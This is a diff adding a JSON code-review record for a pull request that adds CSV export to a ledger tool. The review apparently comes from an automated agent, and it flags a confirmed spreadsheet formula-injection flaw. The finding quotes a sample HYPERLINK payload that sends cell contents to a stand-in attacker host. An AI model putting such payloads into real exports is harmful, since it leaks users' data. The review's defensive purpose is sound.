@@ -1,0 +1,134 @@
+{
+  "run": {
+    "target_kind": "pull-request",
+    "head": "0eb283dfe715341548387bf65af857affedf5dfa",
+    "base_ref": "main",
+    "base_sha": "2301c83ee0b2ba0248fe3d2d1f6cd481963545ab",
+    "merge_base": "2301c83ee0b2ba0248fe3d2d1f6cd481963545ab",
+    "context": "45a2fe742898267c6a52acfad4ff52cb5b988f8eb671321fe4749f479997822f",
+    "issues": ["example/ledger#3"],
+    "coverage": "complete",
+    "repository_url": "https://github.com/example/ledger",
+    "merged": false
+  },
+  "summary": {
+    "status": "Changes Requested",
+    "intent": "Add a `--format csv` option to `ledger statement` that reuses `statement_rows` to export an account's statement as CSV, alongside the existing plain-text default (closes issue #3).",
+    "issue_fit": "Met — the CLI wires `--format {csv,text}` with `text` as the default, the CSV header and decimal formatting match the text statement exactly, and comma/quote/newline descriptions round-trip through `csv.reader`. The confirmed finding below is a security defect in the new export path itself, not a failure of any stated acceptance criterion.",
+    "coverage": "Complete merge-base diff reviewed: `ledger/cli.py` (changed), new `ledger/export.py`, new `tests/test_export.py`. Callees `ledger/accounts.py` and `ledger/statement.py` inspected for the reused formatting and data path. Full suite run once at the pinned head (`python3 -m unittest discover -s tests -v`): 16 passed, 0 failed. One mandatory security verification batch dispatched to a fresh-context worker and confirmed; allowance: initial batch spent, follow-up unused."
+  },
+  "findings": [
+    {
+      "id": "export/csv-formula-injection",
+      "title": "Neutralize formula-trigger characters before writing CSV cells",
+      "priority": "P2",
+      "action": "must-fix",
+      "kind": "security",
+      "trigger": "An entry is posted with a description beginning with a formula-trigger character, for example `=HYPERLINK(\"http://attacker.example/?\"&A1,\"x\")`, via `Ledger.post` (`ledger/accounts.py`), which accepts `description` as an arbitrary string with no character restriction. The account's statement is then exported with `ledger statement FILE ACCOUNT --format csv`, and the resulting file is opened in a spreadsheet application — the consumer the pull request itself names (\"accountants want to open them in a spreadsheet\").",
+      "impact": "The spreadsheet application evaluates the injected formula on open, which can exfiltrate other cell data to an attacker-controlled URL through a `HYPERLINK`/`IMPORTXML`-style payload or, on configurations where legacy dynamic-data-exchange formulas are still honored, run an external command — directly targeting the accountants this feature is built for. This defect is entirely new: at the merge-base, no CSV export path existed at all.",
+      "change": "In `ledger/export.py`'s `statement_csv`, before writing each row, prefix any field whose text begins with `=`, `+`, `-`, `@`, a tab, or a carriage return with a leading single quote (the standard CSV/formula-injection neutralization), so spreadsheet applications render the cell as text instead of evaluating it.",
+      "source": "pr-body (\"accountants want to open them in a spreadsheet\"); independently confirmed by a fresh-context verifier, which reproduced the unmodified formula in `statement_csv`'s output.",
+      "anchor": {
+        "type": "line",
+        "path": "ledger/export.py",
+        "start_line": 18,
+        "end_line": 18,
+        "side": "RIGHT"
+      },
+      "fix": {
+        "path": "ledger/export.py",
+        "start_line": 13,
+        "end_line": 19
+      }
+    }
+  ],
+  "questions": [],
+  "observations": [
+    {
+      "fact": "`tests/test_cli.py` has no case invoking `--format csv`; the flag's wiring from `ledger/cli.py`'s `FORMATS` dict to `statement_csv` is exercised only by this review's manual CLI run, not by an added or existing automated test.",
+      "evidence": "`tests/test_cli.py` (no `--format` case); `ledger/cli.py:13,35,44`."
+    }
+  ],
+  "prior_items": [],
+  "record": {
+    "repository": "/tmp/rcs-savings/baseline/publishable/repo",
+    "paths": {
+      "private_dir": "/tmp/rcs-savings/baseline/publishable/work/private",
+      "store": "/tmp/rcs-savings/baseline/publishable/work/private/review-context-0eb283d.json",
+      "composition": "/tmp/rcs-savings/baseline/publishable/work/private/composition.json",
+      "addenda": "/tmp/rcs-savings/baseline/publishable/work/private/addenda",
+      "skill_root": "/tmp/rcs-savings/skills/d8c2dd9/skills/review-code"
+    },
+    "requirements": [
+      {
+        "source": "issue-3/acceptance-criterion-1",
+        "class": "acceptance",
+        "disposition": "met",
+        "evidence": "ledger/cli.py:13 `FORMATS = {\"text\": render_statement, \"csv\": statement_csv}`; :35 `--format` argument, `default=\"text\"`; :44 dispatches via `FORMATS[args.format]`. Manual run: `ledger statement FILE 1001 --format csv` printed CSV; the bare command still printed text."
+      },
+      {
+        "source": "issue-3/acceptance-criterion-2",
+        "class": "acceptance",
+        "disposition": "met",
+        "evidence": "ledger/export.py:10 `HEADER = (\"date\", \"description\", \"amount\", \"balance\")`; tests/test_export.py:19 asserts `lines[0] == \"date,description,amount,balance\"`."
+      },
+      {
+        "source": "issue-3/acceptance-criterion-3",
+        "class": "acceptance",
+        "disposition": "met",
+        "evidence": "ledger/export.py reuses ledger/statement.py:14-21 `statement_rows`, which formats every amount and running balance through `format_cents`; tests/test_export.py:20 asserts a row of `\"2026-09-01,deposit,100.00,100.00\"` and :24 asserts `\"-4.50\"`."
+      },
+      {
+        "source": "issue-3/acceptance-criterion-4",
+        "class": "acceptance",
+        "disposition": "met",
+        "evidence": "csv.writer's default QUOTE_MINIMAL quotes any field containing the delimiter, the quote character, or the line terminator; tests/test_export.py:22-24 covers a description with a comma and embedded quotes and asserts the exact round-tripped value through csv.reader. This review additionally reproduced a description containing embedded newlines and confirmed it also round-trips through csv.reader (not covered by an added test)."
+      }
+    ],
+    "files": [
+      {"path": "ledger/cli.py", "state": "reviewed"},
+      {"path": "ledger/export.py", "state": "reviewed"},
+      {"path": "tests/test_export.py", "state": "reviewed"}
+    ],
+    "check_evidence": [
+      {
+        "check": "python3 -m unittest discover -s tests -v",
+        "head": "0eb283dfe715341548387bf65af857affedf5dfa",
+        "outcome": "reviewer-executed",
+        "reason": "Full repository suite run once, wrapped for timing, in the reviewed checkout at the pinned head; clean tree; all 16 tests passed (exit 0), including the two new ExportTest cases."
+      }
+    ],
+    "verification": {
+      "tasks": [
+        {
+          "id": "export/csv-formula-injection",
+          "type": "candidate",
+          "trigger": "security",
+          "batch": "initial",
+          "ruling": "confirmed"
+        }
+      ],
+      "batches": [
+        {
+          "name": "initial",
+          "phase": "initial",
+          "bundle": "/tmp/rcs-savings/baseline/publishable/work/private/verify-initial",
+          "raw_return": "/tmp/rcs-savings/baseline/publishable/work/private/verify-initial/raw-return.json",
+          "accounting": "/tmp/rcs-savings/baseline/publishable/work/private/verify-initial/accounting.json",
+          "operation": "Agent(subagent_type=general-purpose, model=sonnet, fresh context, run_in_background=false)"
+        }
+      ],
+      "allowance": {
+        "initial_spent": true,
+        "follow_up_spent": false,
+        "carried_from": null
+      },
+      "outstanding": []
+    },
+    "routed": {
+      "unresolved": [],
+      "disputed": [],
+      "unrecoverable_inputs": []
+    }
+  }
+}
